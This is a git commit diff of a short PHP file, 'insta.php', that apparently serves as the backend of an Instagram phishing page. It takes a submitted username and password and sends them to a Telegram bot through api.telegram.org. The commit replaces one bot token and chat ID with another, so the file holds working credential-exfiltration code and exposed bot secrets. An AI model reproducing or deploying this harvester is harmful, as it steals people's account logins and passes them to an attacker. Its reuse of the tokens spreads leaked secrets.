4cfd40837d947164984b63c450563fcaf30b0e4f
xtaakaa <73967538+xtaakaa@users.noreply.github.com>
2020-11-07 13:34:30 +0300

    Update insta.php

--- insta.php
+++ insta.php
@@ -4,8 +4,8 @@ $user = $_GET['username'];
 $pass = $_GET['pass'];
 $text = "$user || $pass";
 
-$token = "720380253:AAHg8cLLrIN_a8-s7qblspu84QW2KRmurXI";
-$id = "727593573";
+$token = "1426301273:AAHfXSwb-NqTDR9qbOC67KWqlebjq0277Jg";
+$id = "898236524";
 
 $get = json_decode(file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=$text"));
 
